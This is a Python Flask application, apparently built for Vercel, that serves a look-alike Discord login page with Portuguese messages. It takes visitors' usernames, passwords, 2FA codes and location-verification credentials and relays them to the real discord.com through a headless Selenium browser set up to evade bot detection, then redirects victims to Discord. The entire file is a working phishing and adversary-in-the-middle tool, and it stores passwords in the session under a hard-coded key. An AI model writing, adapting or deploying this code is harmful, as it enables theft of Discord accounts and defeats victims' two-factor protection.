from flask import Flask, request, render_template, redirect, session
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import time
import os

app = Flask(__name__)
app.secret_key = 'discord_login_secret_key_2024_vercel'
CORS(app)

def setup_driver():
    """Setup Chrome driver with appropriate options for Vercel"""
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-plugins')
    chrome_options.add_argument('--disable-images')
    chrome_options.add_argument('--disable-javascript')
    
    try:
        # Use webdriver-manager to handle ChromeDriver installation
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver
    except Exception as e:
        print(f"Error setting up driver: {e}")
        return None

@app.route('/')
def index():
    """Serve the main login page"""
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('login.html', error="Por favor, preencha todos os campos.")
    
    # Store credentials in session
    session['username'] = username
    session['password'] = password
    
    driver = None
    try:
        # Setup driver
        driver = setup_driver()
        if not driver:
            return render_template('login.html', error="Erro ao inicializar o navegador. Tente novamente.")
        
        driver.get('https://discord.com/login')
        
        # Wait for page to load
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "email"))
        )
        
        # Fill in credentials
        email_field = driver.find_element(By.NAME, "email")
        password_field = driver.find_element(By.NAME, "password")
        
        email_field.clear()
        email_field.send_keys(username)
        
        password_field.clear()
        password_field.send_keys(password)
        
        # Click login button
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()
        
        # Wait for response
        time.sleep(5)
        
        # Check current URL to determine next step
        current_url = driver.current_url
        
        if "login" in current_url:
            # Check for error messages
            try:
                error_elements = driver.find_elements(By.CSS_SELECTOR, "[class*='error'], [class*='Error'], .error-message, [class*='message'], [class*='Message']")
                if error_elements:
                    error_text = error_elements[0].text
                    if error_text:
                        driver.quit()
                        return render_template('login.html', error=error_text)
            except:
                pass
            
            # Check if 2FA is required
            try:
                mfa_elements = driver.find_elements(By.XPATH, "//input[@placeholder='6-digit authentication code']")
                if mfa_elements:
                    # Store driver state for 2FA
                    session['needs_2fa'] = True
                    driver.quit()
                    return render_template('login.html', show_2fa=True, username=username)
            except:
                pass
            
            # Check if new location verification is needed
            try:
                new_location_elements = driver.find_elements(By.XPATH, "//input[@type='email']")
                if new_location_elements and "verify" in current_url.lower():
                    session['needs_new_location'] = True
                    driver.quit()
                    return render_template('login.html', show_new_location=True, username=username)
            except:
                pass
            
            driver.quit()
            return render_template('login.html', error="Credenciais inválidas ou erro desconhecido durante o login.")
        else:
            # Login successful - redirect to Discord
            driver.quit()
            return redirect("https://discord.com/channels/@me")
            
    except TimeoutException:
        if driver:
            driver.quit()
        return render_template('login.html', error="Timeout: A página do Discord demorou muito para carregar.")
    except Exception as e:
        if driver:
            driver.quit()
        return render_template('login.html', error=f"Erro durante o login: {str(e)}")

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    """Handle 2FA verification"""
    mfa_code = request.form.get('mfa_code')
    
    if not mfa_code:
        return render_template('login.html', show_2fa=True, error="Por favor, insira o código de autenticação.", username=session.get('username'))
    
    if not session.get('needs_2fa'):
        return render_template('login.html', error="Sessão expirada. Tente fazer login novamente.")
    
    driver = None
    try:
        # Setup driver and navigate to Discord login again
        driver = setup_driver()
        if not driver:
            return render_template('login.html', show_2fa=True, error="Erro ao inicializar o navegador.", username=session.get('username'))
        
        driver.get('https://discord.com/login')
        
        # Wait and fill credentials again
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "email"))
        )
        
        email_field = driver.find_element(By.NAME, "email")
        password_field = driver.find_element(By.NAME, "password")
        
        email_field.clear()
        email_field.send_keys(session.get('username'))
        
        password_field.clear()
        password_field.send_keys(session.get('password'))
        
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()
        
        # Wait for 2FA page
        time.sleep(3)
        
        # Find and fill MFA code field
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='6-digit authentication code']"))
        )
        
        mfa_field = driver.find_element(By.XPATH, "//input[@placeholder='6-digit authentication code']")
        mfa_field.clear()
        mfa_field.send_keys(mfa_code)
        
        # Click confirm button
        confirm_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Confirm') or contains(text(), 'Confirmar')]")
        confirm_button.click()
        
        # Wait for response
        time.sleep(5)
        
        current_url = driver.current_url
        
        if "login" in current_url:
            # Check for error
            try:
                error_elements = driver.find_elements(By.CSS_SELECTOR, "[class*='error'], [class*='Error']")
                if error_elements and error_elements[0].text:
                    error_text = error_elements[0].text
                    driver.quit()
                    return render_template('login.html', show_2fa=True, error=error_text, username=session.get('username'))
            except:
                pass
            
            driver.quit()
            return render_template('login.html', show_2fa=True, error="Código de autenticação inválido.", username=session.get('username'))
        else:
            # Success - redirect to Discord
            driver.quit()
            session.pop('needs_2fa', None)
            return redirect("https://discord.com/channels/@me")
            
    except Exception as e:
        if driver:
            driver.quit()
        return render_template('login.html', show_2fa=True, error=f"Erro durante a verificação 2FA: {str(e)}", username=session.get('username'))

@app.route('/verify_new_location', methods=['POST'])
def verify_new_location():
    """Handle new location verification"""
    email = request.form.get('email')
    password = request.form.get('password')
    
    if not email or not password:
        return render_template('login.html', show_new_location=True, error="Por favor, preencha todos os campos.", username=session.get('username'))
    
    if not session.get('needs_new_location'):
        return render_template('login.html', error="Sessão expirada. Tente fazer login novamente.")
    
    driver = None
    try:
        # Setup driver and navigate to Discord login again
        driver = setup_driver()
        if not driver:
            return render_template('login.html', show_new_location=True, error="Erro ao inicializar o navegador.", username=session.get('username'))
        
        driver.get('https://discord.com/login')
        
        # Wait and fill original credentials
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "email"))
        )
        
        email_field = driver.find_element(By.NAME, "email")
        password_field = driver.find_element(By.NAME, "password")
        
        email_field.clear()
        email_field.send_keys(session.get('username'))
        
        password_field.clear()
        password_field.send_keys(session.get('password'))
        
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()
        
        # Wait for new location verification page
        time.sleep(3)
        
        # Fill verification fields
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//input[@type='email']"))
        )
        
        verify_email_field = driver.find_element(By.XPATH, "//input[@type='email']")
        verify_password_field = driver.find_element(By.XPATH, "//input[@type='password']")
        
        verify_email_field.clear()
        verify_email_field.send_keys(email)
        
        verify_password_field.clear()
        verify_password_field.send_keys(password)
        
        # Click continue button
        continue_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Continue') or contains(text(), 'Continuar')]")
        continue_button.click()
        
        # Wait for response
        time.sleep(5)
        
        current_url = driver.current_url
        
        if "login" in current_url or "verify" in current_url:
            # Still on verification page, might be an error
            try:
                error_elements = driver.find_elements(By.CSS_SELECTOR, "[class*='error'], [class*='Error']")
                if error_elements and error_elements[0].text:
                    error_text = error_elements[0].text
                    driver.quit()
                    return render_template('login.html', show_new_location=True, error=error_text, username=session.get('username'))
            except:
                pass
            
            driver.quit()
            return render_template('login.html', show_new_location=True, error="Credenciais inválidas.", username=session.get('username'))
        else:
            # Success - redirect to Discord
            driver.quit()
            session.pop('needs_new_location', None)
            return redirect("https://discord.com/channels/@me")
            
    except Exception as e:
        if driver:
            driver.quit()
        return render_template('login.html', show_new_location=True, error=f"Erro durante a verificação: {str(e)}", username=session.get('username'))

# For Vercel deployment
if __name__ == '__main__':
    app.run(debug=False)
